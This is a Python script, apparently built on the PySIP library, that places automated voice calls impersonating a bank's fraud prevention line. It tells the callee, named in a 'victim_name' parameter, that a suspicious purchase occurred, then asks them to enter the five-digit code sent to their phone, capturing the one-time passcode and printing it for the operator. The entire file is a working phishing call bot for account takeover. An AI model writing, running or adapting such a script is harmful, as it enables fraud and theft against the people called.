import asyncio
from PySIP.call_handler import CallHandler


DELAY_ERR_MESSAGE = "We did no receive any input. Please enter the 5 digit confirmation code we have sent to your number"
DELAY_ERR_MESSAGE_2 = "Please press 1 if this was not you, otherwise presee 2"


def typing_cb():
    print("Typing dtmf...")

async def bank_script(call_handler: CallHandler, bank_name: str, victim_name: str):
    try:
        asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))
        # Phase 1
        await call_handler.say(f"Welcome to {bank_name} fraud prevention line")
        await call_handler.say(f"Hello {victim_name}, We have recently received an online purchase request from your {bank_name} account. If this was not you press 1")
        dtmf_result = await call_handler.gather_and_say(delay_msg=DELAY_ERR_MESSAGE_2)
        print("The DTMF result is:-> ", dtmf_result)

        if not dtmf_result:
            await call_handler.sleep(1.5)
            await call_handler.hangup()
            return

        
        # Phase 2
        await call_handler.say("We need to confirm you identity before blocking this request. Please enter the 5 digit code we sent to your number followed by the pound key")
        dtmf_result = await call_handler.gather_and_say(length=5, delay=8, finish_on_key="#", delay_msg=DELAY_ERR_MESSAGE)

        if dtmf_result:
            print("The DTMF result is:-> ", dtmf_result) 
            stream_id = await call_handler.say("Thank you for entering the code, good bye.")
            await stream_id.wait_finished()

        await call_handler.hangup()
        print("Script BANKOTP completed running..")

    
    except RuntimeError:
        print("The call is hanged up. Stopping the script...")

